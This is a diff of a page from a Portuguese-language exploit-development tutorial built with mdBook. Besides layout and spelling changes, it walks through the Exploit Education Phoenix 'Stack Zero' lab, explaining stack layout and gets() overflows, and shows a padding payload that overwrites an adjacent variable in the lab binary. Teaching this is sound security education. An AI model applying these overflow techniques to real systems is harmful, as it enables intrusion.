@@ -1,234 +1,146 @@
 <!DOCTYPE HTML>
-<html lang="pt-br" class="sidebar-visible no-js ayu">
+<html lang="en">
     <head>
-        <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
         <title>Um Livrinho Sobre Exploit Dev</title>
-        
-        <meta name="robots" content="noindex" />
-        
-        
-
-
-        <!-- Custom HTML head -->
-        
-
-
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="theme-color" content="#ffffff" />
 
-        
-        <link rel="icon" href="favicon.svg">
-        
-        
+        <base href="">
+
+        <link rel="stylesheet" href="book.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
         <link rel="shortcut icon" href="favicon.png">
-        
-        <link rel="stylesheet" href="css/variables.css">
-        <link rel="stylesheet" href="css/general.css">
-        <link rel="stylesheet" href="css/chrome.css">
-        
-        <link rel="stylesheet" href="css/print.css" media="print">
-        
 
-        <!-- Fonts -->
-        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
-        
-        <link rel="stylesheet" href="fonts/fonts.css">
-        
+        <!-- Font Awesome -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
 
-        <!-- Highlight.js Stylesheets -->
         <link rel="stylesheet" href="highlight.css">
         <link rel="stylesheet" href="tomorrow-night.css">
         <link rel="stylesheet" href="ayu-highlight.css">
 
-        <!-- Custom theme stylesheets -->
+        <!-- Custom theme -->
         
 
         
+
+        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
+        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
+        <script>
+            if (typeof Clipboard == 'undefined') {
+                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch JQuery from CDN but have a local fallback -->
+        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+        <script>
+            if (typeof jQuery == 'undefined') {
+                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
+        <script src="store.js"></script>
+
     </head>
-    <body>
-        <!-- Provide site root to javascript -->
-        <script type="text/javascript">
-            var path_to_root = "";
-            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
-        </script>
-
-        <!-- Work around some values being stored in localStorage wrapped in quotes -->
-        <script type="text/javascript">
-            try {
-                var theme = localStorage.getItem('mdbook-theme');
-                var sidebar = localStorage.getItem('mdbook-sidebar');
-
-                if (theme.startsWith('"') && theme.endsWith('"')) {
-                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
-                }
-
-                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
-                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
-                }
-            } catch (e) { }
-        </script>
-
+    <body class="light">
         <!-- Set the theme before any content is loaded, prevents flash -->
         <script type="text/javascript">
-            var theme;
-            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
-            if (theme === null || theme === undefined) { theme = default_theme; }
-            var html = document.querySelector('html');
-            html.classList.remove('no-js')
-            html.classList.remove('ayu')
-            html.classList.add(theme);
-            html.classList.add('js');
+            var theme = store.get('mdbook-theme');
+            if (theme === null || theme === undefined) { theme = 'light'; }
+            $('body').removeClass().addClass(theme);
         </script>
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script type="text/javascript">
-            var html = document.querySelector('html');
-            var sidebar = 'hidden';
-            if (document.body.clientWidth >= 1080) {
-                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
-                sidebar = sidebar || 'visible';
-            }
-            html.classList.remove('sidebar-visible');
-            html.classList.add("sidebar-" + sidebar);
+            var sidebar = store.get('mdbook-sidebar');
+            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
+            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
         </script>
 
-        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
-            <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="spacer"></li><li class="chapter-item "><a href="aventura.html">Aventura</a></li><li class="chapter-item affix "><li class="part-title">Stack</li><li class="spacer"></li><li class="chapter-item "><a href="stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="stack/mitigacoes.html">Mitigações</a></li><li class="chapter-item "><div>Ret2LibC</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Pratica</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li></ol></li><li class="chapter-item "><div>Avançado: Multiplos ret2libc</div></li></ol></li><li class="chapter-item "><div>Estilo OSCP</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Brainpan</div></li><li class="chapter-item "><div>Tib3rius BOF Prep</div></li></ol></li><li class="chapter-item "><div>ROP</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Ferramentas</div></li><li class="chapter-item "><div>64vs32 Bit</div></li></ol></li><li class="chapter-item "><div>Derrotando ASLR</div></li><li class="chapter-item "><div>Derrotando Canaries</div></li><li class="chapter-item affix "><li class="part-title">Format Strings</li><li class="spacer"></li><li class="chapter-item "><div>Phoenix: Format</div></li><li class="chapter-item affix "><li class="part-title">Heap</li><li class="spacer"></li><li class="chapter-item "><div>Shellphish: How2Heap</div></li></ol>
-            </div>
-            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
-        </nav>
+        <div id="sidebar" class="sidebar">
+            <ul class="chapter"><li><a href="./aventura.html"><strong>1.</strong> Aventura</a></li><li class="spacer"></li><li><a href="./stack/phoenix/setup.html"><strong>2.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>2.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>2.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>2.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>2.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>2.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>2.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>2.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>3.</strong> Mitigações</a></li><li><strong>4.</strong> from pwn import *</li><li><a href="./stack/ret2libc/intro.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Pratica</li><li><ul class="section"><li><strong>5.1.1.</strong> Protostar Stack Six</li></ul></li><li><strong>5.2.</strong> Múltiplos estágios</li><li><strong>5.3.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><strong>6.</strong> Estilo OSCP</li><li><ul class="section"><li><strong>6.1.</strong> Brainpan</li><li><strong>6.2.</strong> Tib3rius BOF Prep</li></ul></li><li><strong>7.</strong> ROP</li><li><ul class="section"><li><strong>7.1.</strong> Primitivos</li><li><ul class="section"><li><strong>7.1.1.</strong> ROPE</li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><strong>7.2.1.</strong> ROPE: pivot</li></ul></li></ul></li><li><strong>8.</strong> Derrotando ASLR</li><li><strong>9.</strong> Derrotando Canaries</li><li class="spacer"></li><li><strong>10.</strong> Phoenix: Format</li><li class="spacer"></li><li><strong>11.</strong> Teoria</li><li><strong>12.</strong> Básico</li><li><ul class="section"><li><strong>12.1.</strong> Fastbins Dup</li><li><strong>12.2.</strong> House of Force</li><li><strong>12.3.</strong> Unsafe Unlink</li><li><strong>12.4.</strong> Safe Unlink</li><li><strong>12.5.</strong> Unsorted bins: Partial Unlink</li><li><strong>12.6.</strong> Frame Faking</li></ul></li><li><strong>13.</strong> Intermediário</li><li><ul class="section"><li><strong>13.1.</strong> House of Orange</li><li><ul class="section"><li><strong>13.1.1.</strong> Heap Extension</li><li><strong>13.1.2.</strong> Vtable + File Stream Exploitation</li><li><strong>13.1.3.</strong> Unindo tudo isso!</li></ul></li><li><strong>13.2.</strong> House of Spirit</li></ul></li><li><strong>14.</strong> Avançado</li><li><ul class="section"><li><strong>14.1.</strong> House of Rust</li></ul></li><li><strong>15.</strong> Shellphish: How2Heap</li><li class="spacer"></li><li><strong>16.</strong> Intro AFL</li></ul>
+        </div>
 
         <div id="page-wrapper" class="page-wrapper">
 
-            <div class="page">
+            <div class="page" tabindex="-1">
                 
-                <div id="menu-bar-hover-placeholder"></div>
-                <div id="menu-bar" class="menu-bar sticky bordered">
+                <div id="menu-bar" class="menu-bar">
                     <div class="left-buttons">
-                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
-                            <i class="fa fa-bars"></i>
-                        </button>
-                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
-                            <i class="fa fa-paint-brush"></i>
-                        </button>
-                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
-                        </ul>
-                        
-                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
-                            <i class="fa fa-search"></i>
-                        </button>
-                        
+                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
+                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                     </div>
 
                     <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
 
                     <div class="right-buttons">
-                        
-                        <a href="print.html" title="Print this book" aria-label="Print this book">
-                            <i id="print-button" class="fa fa-print"></i>
+                        <a href="print.html">
+                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                         </a>
-                        
-                        
-                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
-                            <i id="git-repository-button" class="fa fa-github"></i>
-                        </a>
-                        
                     </div>
                 </div>
-
-                
-                <div id="search-wrapper" class="hidden">
-                    <form id="searchbar-outer" class="searchbar-outer">
-                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
-                    </form>
-                    <div id="searchresults-outer" class="searchresults-outer hidden">
-                        <div id="searchresults-header" class="searchresults-header"></div>
-                        <ul id="searchresults">
-                        </ul>
-                    </div>
-                </div>
-                
-
-                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
-                <script type="text/javascript">
-                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
-                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
-                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
-                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
-                    });
-                </script>
 
                 <div id="content" class="content">
-                    <main>
-                        <h1><a class="header" href="#aventura" id="aventura">Aventura</a></h1>
+                    <a class="header" href="print.html#aventura" id="aventura"><h1>Aventura</h1></a>
 <p>Isso nao ta pronto aaaaaaa foi mal :(</p>
 <pre><code>  Stack Intro: Phoenix
         |
      ___|__________ ________  
     |              |        |
     V              V        V
-  Format       O resto     Fuzzing
-  Strings      da Stack
-                   |
-               ____|__
-              |       | 
-              V       V
-           Windows   Heap
-            |        Intro
-    ________|      ____|______________
-   |        |     |    |              |
-   V        |     |    |              |
-   Win      V     |    V              V
- File Sys  Win    |    Heap         Linux
-           Stack  |    Avancado     Kernel
-            |     | 
-            |__ __|
-               |
-               V
-              Win
-              Heap  
+  Format       O resto     Fuzzing__________________________ ___ 
+  Strings      da Stack      |                              |   |
+                   |         |_________ _______ _____       V   |
+               ____|__       |         |       |     |    AFL+  |
+              |       |      V         V       V     |    ASAN  V
+              V       V    Genético   Taint    Sym   |         Peach
+           Windows   Heap            Analise   Exec  |
+            |        Intro                           |
+    ________|      ____V________________             |
+   |        |     |    |                |            |
+   V        |     |    |                |            |
+   Win      V     |    V                V            |
+ File Sys  Win    |    Heap           Linux          |
+           Stack  | Intermediário     Kernel         |
+            |     |     |                |___________|
+            |__ __|     |                            |
+               |        |                            V
+               V        V                           Kernel
+              Win      Heap                         Fuzzing  
+              Heap    Avançado
 </code></pre>
 <p>Opa, tudo bom?</p>
-<p>Tutorialzinho pq não achei nenhum em portugues D:</p>
+<p>Tutorialzinho pq não achei nenhum em português D:</p>
 <p>Se encontrar algum erro, abre uma issue pf :)</p>
-<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong> </p>
+<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong></p>
 <p>Eu ainda não postei tudo, mas quando tiver tempo eu posto :D</p>
 <p>Se quiser um bom em ingles:</p>
 <p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
 <p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas é sobre o antigo: Protostar)</a></p>
 <p>Status</p>
 <ul>
-<li><input disabled="" type="checkbox" checked=""/>
-Stack</li>
-<li><input disabled="" type="checkbox"/>
-Format</li>
-<li><input disabled="" type="checkbox"/>
-Heap</li>
-<li><input disabled="" type="checkbox"/>
-Net</li>
-<li><input disabled="" type="checkbox"/>
-Final</li>
+<li>[X] Stack</li>
+<li>[ ] Format</li>
+<li>[ ] Heap</li>
+<li>[ ] Net</li>
+<li>[ ] Final</li>
 </ul>
-<h1><a class="header" href="#-prerequisitos" id="-prerequisitos">🖥️ Prerequisitos:</a></h1>
+<a class="header" href="print.html#-prerequisitos" id="-prerequisitos"><h1>🖥️ Prerequisitos:</h1></a>
 <ul>
 <li>Saber alguma linguagem de programação e conceitos relacionados</li>
 </ul>
-<h1><a class="header" href="#-opcional-mas-util-saber" id="-opcional-mas-util-saber">🐧 Opcional mas util saber</a></h1>
+<a class="header" href="print.html#-opcional-mas-util-saber" id="-opcional-mas-util-saber"><h1>🐧 Opcional mas util saber</h1></a>
 <ul>
 <li>💾 Um pouco de C / C++ / Rust / Linguagem de nível baixo</li>
 <li>🐍 Alguma linguagem de scripting: Python, Ruby, .....</li>
-<li>🐧 Saber o basico de Linux</li>
+<li>🐧 Saber o básico de Linux</li>
 </ul>
-<h1><a class="header" href="#-setup" id="-setup">🤖 Setup:</a></h1>
+<a class="header" href="print.html#-setup" id="-setup"><h1>🤖 Setup:</h1></a>
 <ul>
 <li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
 <li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
@@ -240,41 +152,41 @@ $ chmod +x boot-exploit-education-phoenix-amd64.sh
 $ ./boot-exploit-education-phoenix-amd64.sh
 </code></pre>
 <ul>
-<li><strong>NÂO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Miniza e esquece que ele existe!</li>
-<li>Usa: ssh -p 2222 user@localhost # Os usuarios/senha são: user/user e root/root</li>
+<li><strong>NÂO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Minimiza e esquece que ele existe!</li>
+<li>Usa: ssh -p 2222 user@localhost # Os usuários/senha são: user/user e root/root</li>
 <li>Os arquivos tão em: cd /opt/phoenix/amd64</li>
 </ul>
 <p>Boa Sorte! :D</p>
-<h1><a class="header" href="#-descrição" id="-descrição">📝 Descrição</a></h1>
-<p>Esse nivel demonstra que memoria pode ser acessada fora da sua região 
-inicialmente alocada, como as variaveis são alocadas na stack, e que altera-las pode mudar a execução do programa.</p>
-<p>Objetivo: Alterar a variavel &quot;changeme&quot;</p>
-<h1><a class="header" href="#-dica" id="-dica">💡 Dica</a></h1>
+<a class="header" href="print.html#-descrição" id="-descrição"><h1>📝 Descrição</h1></a>
+<p>Esse nível demonstra que memoria pode ser acessada fora da sua região
+inicialmente alocada, como as variáveis são alocadas na stack, e que altera-las pode mudar a execução do programa.</p>
+<p>Objetivo: Alterar a variável &quot;changeme&quot;</p>
+<a class="header" href="print.html#-dica" id="-dica"><h1>💡 Dica</h1></a>
 <pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
 AAAAAAAAAA
 
 $ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
 </code></pre>
-<h1><a class="header" href="#conhecimento-preliminar" id="conhecimento-preliminar">Conhecimento Preliminar</a></h1>
-<h2><a class="header" href="#buffer" id="buffer">Buffer</a></h2>
+<a class="header" href="print.html#conhecimento-preliminar" id="conhecimento-preliminar"><h1>Conhecimento Preliminar</h1></a>
+<a class="header" href="print.html#buffer" id="buffer"><h2>Buffer</h2></a>
 <p>Buffers são similares a arrays em outras linguagens de programação,
 mas possuem tamanho fixo!</p>
-<p>Eles são definidos usando: <code>tipo nome[tamanho]</code> </p>
+<p>Eles são definidos usando: <code>tipo nome[tamanho]</code></p>
 <p>O <code>tipo</code>, é do que esta sendo armazenado dentro, por exemplo:</p>
 <pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
 int buf[32];  // Armazena 32 ints
 </code></pre>
-<p>Esses buffers por possuirem tamanho fixo, são armazenados na stack!</p>
-<h2><a class="header" href="#stack" id="stack">Stack</a></h2>
+<p>Esses buffers por possuírem tamanho fixo, são armazenados na stack!</p>
+<a class="header" href="print.html#stack" id="stack"><h2>Stack</h2></a>
 <p>A stack é uma porção da memoria que armazena como se fosse uma pilha de pratos:</p>
 <pre><code>Quando você quer colocar um novo, você coloca no topo da pilha (push)
-Qando você quer pegar um da pilha, você pega o do topo (pop)
+Quando você quer pegar um da pilha, você pega o do topo (pop)
 
 O ultimo a entrar, é o primeiro a sair...
 o nome desse comportamento é LIFO (Last in First Out)
 </code></pre>
-<p><img src="stack/phoenix/./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
-<h3><a class="header" href="#a-stack-cresce-para-valores-menores" id="a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></h3>
+<p><img src="./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
+<a class="header" href="print.html#a-stack-cresce-para-valores-menores" id="a-stack-cresce-para-valores-menores"><h3>A stack cresce para valores menores</h3></a>
 <pre><code>Imagina que ela é um poço que começa na profundidade 15
 
 Quando você coloca um objeto de tamanho 2 no poço:
@@ -286,34 +198,34 @@ vai estar apoiado na profundidade 13, e vai até a profundidade 10
 <p>Conforme você vai <strong>adicionando</strong> itens, o endereço que eles estão vai <strong>diminuindo</strong> em valor.
 É meio confuso, mas com o tempo você pega o jeito.</p>
 <p>Pra complicar um pouco mais, esses endereços tão em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; é pra representar que o valor tá em hex).</p>
-<h3><a class="header" href="#hex" id="hex">Hex</a></h3>
+<a class="header" href="print.html#hex" id="hex"><h3>Hex</h3></a>
 <p>Se vc não souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numeração hexadecimal</a>
 . Mas resumindo, em hex você conta:</p>
 <pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
 Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
 </code></pre>
 <p>Então a base da stack é 0xFFFFFFFF e o topo 0X00000000 !</p>
-<h3><a class="header" href="#melhorando-o-exemplo-do-poço" id="melhorando-o-exemplo-do-poço">Melhorando o exemplo do poço</a></h3>
+<a class="header" href="print.html#melhorando-o-exemplo-do-poço" id="melhorando-o-exemplo-do-poço"><h3>Melhorando o exemplo do poço</h3></a>
 <pre><code>0x0- 	     Topo da stack/Topo do poço
 0xA ate 0x1- espaço vazio
 0xD-         Segundo item
 0xF-         Base da stack/Fundo do poço, primeiro item
 </code></pre>
-<h1><a class="header" href="#-explicação" id="-explicação">🎉 Explicação</a></h1>
+<a class="header" href="print.html#-explicação" id="-explicação"><h1>🎉 Explicação</h1></a>
 <p>A função main() pode estar sendo divida em 3 Partes:</p>
 <ol>
-<li>🥞 Alocando as variaveis na stack (buffer[64], changeme)</li>
+<li>🥞 Alocando as variáveis na stack (buffer[64], changeme)</li>
 <li>💥 Alterar buffer[64] usando gets()</li>
 <li>✅ Checando se changeme foi alterada</li>
 </ol>
 <pre><code class="language-C">int main(int argc, char **argv) {
-			// Definir variaveis locais
+            // Definir variáveis locais
   struct {
     char buffer[64];
     volatile int changeme;
   } locals;
 
-  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo nivel faz isso)
+  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo nível faz isso)
 
   locals.changeme = 0;
   gets(locals.buffer);   // Alterar o buffer
@@ -328,21 +240,21 @@ Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
 }
 </code></pre>
 <p>Ue, <code>changeme</code> nunca foi alterada... Ela não deveria estar mudando!</p>
-<p>Calma que você ja vai enteder :)</p>
-<h2><a class="header" href="#-1--alocando-as-variaveis-na-stack-buffer64-changeme" id="-1--alocando-as-variaveis-na-stack-buffer64-changeme">🥞 1- Alocando as variaveis na stack (buffer[64], changeme)</a></h2>
-<p>A variavel <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
-<p>A variavel <code>changeme</code> esta marcada como <code>volátil</code> para previnir que o compilador
+<p>Calma que você ja vai entender :)</p>
+<a class="header" href="print.html#-1--alocando-as-variáveis-na-stack-buffer64-changeme" id="-1--alocando-as-variáveis-na-stack-buffer64-changeme"><h2>🥞 1- Alocando as variáveis na stack (buffer[64], changeme)</h2></a>
+<p>A variável <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
+<p>A variável <code>changeme</code> esta marcada como <code>volátil</code> para prevenir que o compilador
 destrua ela (pq originalmente não seria
-alterada, então seria destruida para otimizar o código... 
-Mas nós vamos alterar ela por metodos... ~risada malefica~ ... não convencionais hehehe).</p>
-<p>Nossas duas variaveis (buffer[64] e changeme) são empurradas na stack.</p>
+alterada, então seria destruída para otimizar o código...
+Mas nós vamos alterar ela por métodos... ~risada maléfica~ ... não convencionais hehehe).</p>
+<p>Nossas duas variáveis (buffer[64] e changeme) são empurradas na stack.</p>
 <pre><code>buffer[64] (preenchido com zeros (vazio))
 changeme   (com o valor: 0x00)
 ret        - Base dessa stack
 </code></pre>
-<h2><a class="header" href="#-2--alterar-buffer64-usando-gets" id="-2--alterar-buffer64-usando-gets">💥 2- Alterar buffer[64] usando gets</a></h2>
+<a class="header" href="print.html#-2--alterar-buffer64-usando-gets" id="-2--alterar-buffer64-usando-gets"><h2>💥 2- Alterar buffer[64] usando gets</h2></a>
 <p>A função <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
-<p>O problema é que ela <strong>não</strong> checa se o valor recebido é maior que o <code>buffer</code>, permitindo que 
+<p>O problema é que ela <strong>não</strong> checa se o valor recebido é maior que o <code>buffer</code>, permitindo que
 você <strong>escreva fora do buffer!!</strong> D:</p>
 <p>Ela vai começar a escrever no topo do buffer (menor endereço)
 e vai descendo até a base da stack.</p>
@@ -358,16 +270,16 @@ A
 changeme (com valor 0x00)
 ret       - Base dessa stack
 </code></pre>
-<p>Então, caso colocassemos 100 &quot;A&quot;s no buffer de tamanho 64, as variaveis nos proximos 36 endereços seriam alteradas.</p>
-<p>Essas variaveis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
+<p>Então, caso colocássemos 100 &quot;A&quot;s no buffer de tamanho 64, as variáveis nos próximos 36 endereços seriam alteradas.</p>
+<p>Essas variáveis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
 <p>O valor ASCII do &quot;A&quot; é 0x41, você pode checar o de todas letras usando:</p>
 <blockquote>
 <p>$ man ascii</p>
 </blockquote>
-<p>Ui, o usuario pode escrever fora memoria dele? perigoso ne! D:</p>
+<p>Ui, o usuário pode escrever fora memoria dele? perigoso ne! D:</p>
 <p>É por isso que essa função está marcada como <em>Deprecated</em> (fora de uso).</p>
 <p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
-Isso quer dizer que antes a variavel <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
+Isso quer dizer que antes a variável <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
 <pre><code>**Stack**
 buffer
       [
@@ -380,7 +292,7 @@ buffer
 changeme (com o valor: 41)
 ret       - Base dessa stack
 </code></pre>
-<h2><a class="header" href="#-3--o-programa-checa-se-changeme-foi-alterada" id="-3--o-programa-checa-se-changeme-foi-alterada">✅ 3- O programa checa se changeme foi alterada</a></h2>
+<a class="header" href="print.html#-3--o-programa-checa-se-changeme-foi-alterada" id="-3--o-programa-checa-se-changeme-foi-alterada"><h2>✅ 3- O programa checa se changeme foi alterada</h2></a>
 <p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, é vitoria!!! :D</p>
 <p>Ta, mas como a gente faz isso na prática?</p>
 <p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
@@ -392,22 +304,22 @@ ret       - Base dessa stack
 .
 .
 </code></pre>
-<h3><a class="header" href="#-64-as-changeme-não-alterado" id="-64-as-changeme-não-alterado">❌ 64 As, changeme não alterado</a></h3>
+<a class="header" href="print.html#-64-as-changeme-não-alterado" id="-64-as-changeme-não-alterado"><h3>❌ 64 As, changeme não alterado</h3></a>
 <pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
 Banner
 Uh oh, 'changeme' has not yet been changed.
 Would you like to try again?
 </code></pre>
-<h3><a class="header" href="#-65-as-changeme-alterado" id="-65-as-changeme-alterado">✅ 65 As, changeme alterado</a></h3>
+<a class="header" href="print.html#-65-as-changeme-alterado" id="-65-as-changeme-alterado"><h3>✅ 65 As, changeme alterado</h3></a>
 <pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
 Banner
 Well done, the 'changeme' variable has been changed!
 </code></pre>
-<h3><a class="header" href="#🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab" id="🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab">🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></h3>
-<p>Para demonstrar melhor esse comportamento do buffer 
+<a class="header" href="print.html#🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab" id="🅱-64-as-e-um-b-0x42-aaaaaaaaaaaab"><h3>🅱️ 64 As e um B (0x42): AAAAAAAAA.....AAAB</h3></a>
+<p>Para demonstrar melhor esse comportamento do buffer
 ser escrito em um sentido específico (pq vai ser muito importante saber disso),
 vou dar outro exemplo:
-<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code> </p>
+<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code></p>
 <pre><code class="language-md">buffer [
 41           | Gets escreve nesse sentido
 41           |
@@ -418,56 +330,56 @@ vou dar outro exemplo:
 changeme (com o valor: 42)   &lt;- B = 42!!!!
 ret       - Base dessa stack
 </code></pre>
-<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na variavel!! Uhhuuu :D</p>
+<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na variável!! Uhhuuu :D</p>
 <p>Esses As só pra encher a stack são chamados de <code>padding</code> (traduz pra preenchimento).</p>
 <hr />
 <p>Fim! :D</p>
-<p>Ouch... isso foi um bocado de explicação, mas relaxa que daqui pra frente fica mais dificil hehehe :D</p>
-<p>Se você chegou até aqui, você ta de parabens !!!</p>
-<p>Pra lembrar bem, desenha uma stack no papel, da um push nas variaveis e no buffer, mostra o sentido que o 
-buffer escreve, e ele vazando e mudando o valor das outras variaveis...</p>
-<h1><a class="header" href="#-solução" id="-solução">👾 Solução</a></h1>
+<p>Ouch... isso foi um bocado de explicação, mas relaxa que daqui pra frente fica mais difícil hehehe :D</p>
+<p>Se você chegou até aqui, você ta de parabéns !!!</p>
